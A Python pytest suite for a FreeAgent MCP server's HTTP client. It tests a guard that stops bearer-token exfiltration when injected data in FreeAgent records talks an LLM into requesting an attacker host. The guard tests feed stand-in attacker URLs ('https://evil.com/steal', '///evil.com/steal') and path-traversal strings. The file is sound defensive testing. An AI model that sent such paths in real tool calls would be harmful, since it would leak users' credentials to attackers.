"""Tests for src/client.py.

The `TestPathSafetyGuard` class is the security core of this project and must never be
weakened. Its cases come from two places:

1. The original guard's own test suite (samaxbytez/freeagent-mcp's `client.test.ts`),
   so behaviour is checked against the cases that guard was validated against.
2. Python-specific cases, because `urllib.parse.urljoin` follows RFC 3986 while JS's
   `new URL()` follows the WHATWG URL spec, and they disagree at the edges. The spec
   explicitly warned not to assume the port is equivalent without testing it.
"""

import httpx
import pytest
import respx

from src.client import DEFAULT_BASE_URL, FreeAgentApiError, FreeAgentClient, UnsafePathError


@pytest.fixture
def client() -> FreeAgentClient:
    return FreeAgentClient(token_provider=lambda: "test-token")


class TestRequestShape:
    @respx.mock
    async def test_sends_bearer_authorization_header(self, client: FreeAgentClient) -> None:
        route = respx.get(f"{DEFAULT_BASE_URL}/company").mock(
            return_value=httpx.Response(200, json={"company": {}})
        )
        await client.get("/company")
        assert route.calls.last.request.headers["Authorization"] == "Bearer test-token"

    @respx.mock
    async def test_sends_accept_and_user_agent_headers(self, client: FreeAgentClient) -> None:
        route = respx.get(f"{DEFAULT_BASE_URL}/company").mock(
            return_value=httpx.Response(200, json={})
        )
        await client.get("/company")
        request = route.calls.last.request
        assert request.headers["Accept"] == "application/json"
        assert "freeagent-mcp-remote" in request.headers["User-Agent"]

    @respx.mock
    async def test_appends_query_params(self, client: FreeAgentClient) -> None:
        route = respx.get(f"{DEFAULT_BASE_URL}/bills").mock(
            return_value=httpx.Response(200, json={"bills": []})
        )
        await client.get("/bills", params={"view": "open", "page": "2"})
        url = str(route.calls.last.request.url)
        assert "view=open" in url
        assert "page=2" in url

    @respx.mock
    async def test_leading_slash_does_not_discard_the_api_version_prefix(
        self, client: FreeAgentClient
    ) -> None:
        """Python-specific: urljoin(base, '/company') would resolve to /company, dropping
        the /v2 segment entirely. The leading slash must be stripped before resolving."""
        route = respx.get(f"{DEFAULT_BASE_URL}/company").mock(
            return_value=httpx.Response(200, json={})
        )
        await client.get("/company")
        assert str(route.calls.last.request.url).startswith(f"{DEFAULT_BASE_URL}/company")

    @respx.mock
    async def test_accepts_a_path_without_a_leading_slash(self, client: FreeAgentClient) -> None:
        route = respx.get(f"{DEFAULT_BASE_URL}/company").mock(
            return_value=httpx.Response(200, json={})
        )
        await client.get("company")
        assert route.called

    @respx.mock
    async def test_uses_a_custom_base_url_when_given(self) -> None:
        sandbox = "https://api.sandbox.freeagent.com/v2"
        client = FreeAgentClient(token_provider=lambda: "t", base_url=sandbox)
        route = respx.get(f"{sandbox}/company").mock(return_value=httpx.Response(200, json={}))
        await client.get("/company")
        assert route.called

    @respx.mock
    async def test_returns_empty_dict_for_an_empty_response_body(
        self, client: FreeAgentClient
    ) -> None:
        respx.delete(f"{DEFAULT_BASE_URL}/bills/1").mock(return_value=httpx.Response(200, text=""))
        assert await client.delete("/bills/1") == {}

    @respx.mock
    async def test_sends_a_json_body_on_post(self, client: FreeAgentClient) -> None:
        route = respx.post(f"{DEFAULT_BASE_URL}/contacts").mock(
            return_value=httpx.Response(201, json={"contact": {}})
        )
        await client.post("/contacts", json={"contact": {"organisation_name": "Acme"}})
        request = route.calls.last.request
        assert request.headers["Content-Type"] == "application/json"
        assert request.content == b'{"contact":{"organisation_name":"Acme"}}'

    @respx.mock
    async def test_sends_a_json_body_on_put(self, client: FreeAgentClient) -> None:
        route = respx.put(f"{DEFAULT_BASE_URL}/contacts/1").mock(
            return_value=httpx.Response(200, json={})
        )
        await client.put("/contacts/1", json={"contact": {"email": "a@b.com"}})
        assert route.calls.last.request.method == "PUT"

    @respx.mock
    async def test_sends_a_delete_request(self, client: FreeAgentClient) -> None:
        route = respx.delete(f"{DEFAULT_BASE_URL}/contacts/1").mock(
            return_value=httpx.Response(200, text="")
        )
        await client.delete("/contacts/1")
        assert route.calls.last.request.method == "DELETE"


class TestTokenProvider:
    @respx.mock
    async def test_calls_the_provider_on_every_request(self) -> None:
        """The token must be fetched per-call, never cached — OAuthProxy refreshes it
        underneath us and a cached copy would go stale."""
        tokens = iter(["token-1", "token-2"])
        client = FreeAgentClient(token_provider=lambda: next(tokens))
        route = respx.get(f"{DEFAULT_BASE_URL}/company").mock(
            return_value=httpx.Response(200, json={})
        )

        await client.get("/company")
        await client.get("/company")

        assert route.calls[0].request.headers["Authorization"] == "Bearer token-1"
        assert route.calls[1].request.headers["Authorization"] == "Bearer token-2"

    @respx.mock
    async def test_accepts_an_async_token_provider(self) -> None:
        async def provider() -> str:
            return "async-token"

        client = FreeAgentClient(token_provider=provider)
        route = respx.get(f"{DEFAULT_BASE_URL}/company").mock(
            return_value=httpx.Response(200, json={})
        )
        await client.get("/company")
        assert route.calls.last.request.headers["Authorization"] == "Bearer async-token"


class TestPathSafetyGuard:
    """Blocks bearer-token exfiltration through an injected request path.

    The threat: FreeAgent data (invoice comments, contact names) is read back to an LLM
    and could carry a prompt injection that talks the model into calling a tool with a
    path pointing at an attacker's host. Sending that request would hand over the token.
    """

    @pytest.fixture
    def token_spy(self) -> tuple[FreeAgentClient, list[int]]:
        """A client whose token provider records every time it is consulted."""
        calls: list[int] = []

        def provider() -> str:
            calls.append(1)
            return "secret-token"

        return FreeAgentClient(token_provider=provider), calls

    @pytest.mark.parametrize(
        "path",
        [
            "https://evil.com/steal",
            "http://evil.com/steal",
            "HTTPS://evil.com/steal",  # scheme check is case-insensitive
            "ftp://evil.com/steal",
            "javascript://evil.com/steal",
        ],
    )
    @respx.mock
    async def test_rejects_absolute_url_schemes(
        self, token_spy: tuple[FreeAgentClient, list[int]], path: str
    ) -> None:
        client, _ = token_spy
        with pytest.raises(UnsafePathError):
            await client.get(path)

    @pytest.mark.parametrize(
        "path",
        [
            "/contacts/../../users/me",
            "../admin",
            "contacts/..\\..\\secrets",  # backslash separator
            "/a/../../../b",
        ],
    )
    @respx.mock
    async def test_rejects_traversal_sequences(
        self, token_spy: tuple[FreeAgentClient, list[int]], path: str
    ) -> None:
        client, _ = token_spy
        with pytest.raises(UnsafePathError):
            await client.get(path)

    @respx.mock
    async def test_rejects_a_protocol_relative_path_that_escapes_the_origin(
        self, token_spy: tuple[FreeAgentClient, list[int]]
    ) -> None:
        """The case that justifies check 3 existing at all.

        '///evil.com/steal' has no scheme, so the scheme check does not fire, and no
        '..', so the traversal check does not fire. After the leading slash is stripped
        it is '//evil.com/steal', which urljoin resolves to https://evil.com/steal — a
        different host, with our bearer token attached. Only the origin comparison
        catches it. Verified empirically against urljoin, not assumed.
        """
        client, _ = token_spy
        with pytest.raises(UnsafePathError):
            await client.get("///evil.com/steal")

    @respx.mock
    async def test_a_single_protocol_relative_slash_stays_on_our_own_origin(
        self, client: FreeAgentClient
    ) -> None:
        """Documents why '//evil.com/x' is NOT an exfiltration route: stripping the one
        leading slash leaves '/evil.com/x', which resolves back onto api.freeagent.com.
        Recorded as a test so a future refactor of the slash handling cannot silently
        turn this benign case into the dangerous one above."""
        route = respx.get("https://api.freeagent.com/evil.com/steal").mock(
            return_value=httpx.Response(200, json={})
        )
        await client.get("//evil.com/steal")
        assert route.called

    @respx.mock
    async def test_rejected_paths_never_reach_the_network(
        self, token_spy: tuple[FreeAgentClient, list[int]]
    ) -> None:
        client, _ = token_spy
        with pytest.raises(UnsafePathError):
            await client.get("https://evil.com/steal")
        assert respx.calls.call_count == 0

    @respx.mock
    async def test_rejected_paths_never_materialise_the_bearer_token(
        self, token_spy: tuple[FreeAgentClient, list[int]]
    ) -> None:
        """Ordering matters: the guard runs before the token is fetched, so a rejected
        path never even causes the token to be read out of OAuthProxy's storage."""
        client, token_calls = token_spy
        with pytest.raises(UnsafePathError):
            await client.get("https://evil.com/steal")
        assert token_calls == []

    @respx.mock
    async def test_the_rejection_message_does_not_leak_the_token(
        self, token_spy: tuple[FreeAgentClient, list[int]]
    ) -> None:
        client, _ = token_spy
        with pytest.raises(UnsafePathError) as excinfo:
            await client.get("https://evil.com/steal")
        assert "secret-token" not in str(excinfo.value)

    @pytest.mark.parametrize(
        "path",
        [
            "/contacts/123",
            "contacts/123",
            "/bank_transaction_explanations",
            "/invoices/1/transitions/mark_as_sent",
            "/accounting/profit_and_loss/summary",
        ],
    )
    @respx.mock
    async def test_allows_ordinary_api_paths(self, client: FreeAgentClient, path: str) -> None:
        route = respx.get(f"{DEFAULT_BASE_URL}{path if path.startswith('/') else '/' + path}").mock(
            return_value=httpx.Response(200, json={})
        )
        await client.get(path)
        assert route.called

    @respx.mock
    async def test_allows_a_path_containing_dots_that_are_not_traversal(
        self, client: FreeAgentClient
    ) -> None:
        """The guard rejects '..' followed by a separator, not any '..' substring."""
        route = respx.get(f"{DEFAULT_BASE_URL}/categories/..foo").mock(
            return_value=httpx.Response(200, json={})
        )
        await client.get("/categories/..foo")
        assert route.called


class TestGetPaginated:
    """`get_paginated` keeps the pagination headers `get` discards, so a caller can tell a
    truncated list from a complete one. It surfaces the next page *number*, never the full
    Link URL — feeding a URL back as a path would trip the origin guard by design.
    """

    NEXT_LINK = (
        '<https://api.freeagent.com/v2/invoices?page=2&per_page=25>; rel="next", '
        '<https://api.freeagent.com/v2/invoices?page=9&per_page=25>; rel="last"'
    )

    @respx.mock
    async def test_returns_body_and_next_page_when_more_pages_exist(
        self, client: FreeAgentClient
    ) -> None:
        respx.get(f"{DEFAULT_BASE_URL}/invoices").mock(
            return_value=httpx.Response(
                200,
                json={"invoices": [{"id": 1}]},
                headers={"Link": self.NEXT_LINK, "X-Total-Count": "212"},
            )
        )
        body, pagination = await client.get_paginated("/invoices")
        assert body == {"invoices": [{"id": 1}]}
        assert pagination == {"next_page": 2, "total_count": 212}

    @respx.mock
    async def test_returns_empty_pagination_when_there_is_no_next_page(
        self, client: FreeAgentClient
    ) -> None:
        respx.get(f"{DEFAULT_BASE_URL}/company").mock(
            return_value=httpx.Response(200, json={"company": {}})
        )
        body, pagination = await client.get_paginated("/company")
        assert body == {"company": {}}
        assert pagination == {}

    @respx.mock
    async def test_no_next_page_on_the_last_page(self, client: FreeAgentClient) -> None:
        """A last page advertises prev/first links but no `next`; nothing actionable, so no
        pagination metadata is surfaced."""
        last_page_link = (
            '<https://api.freeagent.com/v2/invoices?page=1&per_page=25>; rel="first", '
            '<https://api.freeagent.com/v2/invoices?page=8&per_page=25>; rel="prev"'
        )
        respx.get(f"{DEFAULT_BASE_URL}/invoices").mock(
            return_value=httpx.Response(
                200,
                json={"invoices": []},
                headers={"Link": last_page_link, "X-Total-Count": "212"},
            )
        )
        _, pagination = await client.get_paginated("/invoices")
        assert pagination == {}

    @respx.mock
    async def test_is_guarded_against_origin_escape(self, client: FreeAgentClient) -> None:
        """The new read path must be behind the same guard as every other request."""
        with pytest.raises(UnsafePathError):
            await client.get_paginated("https://evil.com/steal")
        assert respx.calls.call_count == 0


class TestErrorHandling:
    @respx.mock
    async def test_raises_with_status_and_error_code(self, client: FreeAgentClient) -> None:
        respx.get(f"{DEFAULT_BASE_URL}/bills").mock(
            return_value=httpx.Response(
                400, json={"error": "invalid_param", "message": "bad request"}
            )
        )
        with pytest.raises(FreeAgentApiError) as excinfo:
            await client.get("/bills")
        assert excinfo.value.status == 400
        assert excinfo.value.error_code == "invalid_param"
        assert "bad request" in str(excinfo.value)

    @respx.mock
    async def test_parses_freeagents_nested_error_format(self, client: FreeAgentClient) -> None:
        respx.post(f"{DEFAULT_BASE_URL}/bills").mock(
            return_value=httpx.Response(
                422, json={"errors": {"error": {"message": "Contact is required"}}}
            )
        )
        with pytest.raises(FreeAgentApiError) as excinfo:
            await client.post("/bills", json={})
        assert excinfo.value.status == 422
        assert "Contact is required" in str(excinfo.value)

    @respx.mock
    async def test_does_not_echo_a_malformed_error_body(self, client: FreeAgentClient) -> None:
        """An unparseable upstream body must not be spliced into our error message —
        that body is attacker-influencable content heading for an LLM's context."""
        respx.get(f"{DEFAULT_BASE_URL}/bills").mock(
            return_value=httpx.Response(500, text="<html>stack trace with secrets</html>")
        )
        with pytest.raises(FreeAgentApiError) as excinfo:
            await client.get("/bills")
        assert excinfo.value.error_code == "unknown"
        assert "stack trace" not in str(excinfo.value)

    @respx.mock
    async def test_raises_on_a_401_from_freeagent(self, client: FreeAgentClient) -> None:
        respx.get(f"{DEFAULT_BASE_URL}/company").mock(
            return_value=httpx.Response(401, json={"error": "unauthorized"})
        )
        with pytest.raises(FreeAgentApiError) as excinfo:
            await client.get("/company")
        assert excinfo.value.status == 401


class TestRequestRaw:
    """`request_raw` returns the httpx.Response so callers can read headers —
    `X-Total-Count` and `Link` are how the undocumented pagination behaviour gets
    investigated. A second entry point into the HTTP layer is exactly the kind of thing
    that quietly bypasses a security check, so it must be guarded identically.
    """

    @respx.mock
    async def test_exposes_response_headers(self, client: FreeAgentClient) -> None:
        respx.get(f"{DEFAULT_BASE_URL}/bank_transactions").mock(
            return_value=httpx.Response(200, json={}, headers={"X-Total-Count": "412"})
        )
        response = await client.request_raw("GET", "/bank_transactions")
        assert response.headers["X-Total-Count"] == "412"

    @respx.mock
    async def test_is_guarded_against_origin_escape(self, client: FreeAgentClient) -> None:
        with pytest.raises(UnsafePathError):
            await client.request_raw("GET", "https://evil.com/steal")
        assert respx.calls.call_count == 0

    @respx.mock
    async def test_still_raises_on_api_errors(self, client: FreeAgentClient) -> None:
        respx.get(f"{DEFAULT_BASE_URL}/company").mock(
            return_value=httpx.Response(404, json={"error": "not_found"})
        )
        with pytest.raises(FreeAgentApiError):
            await client.request_raw("GET", "/company")
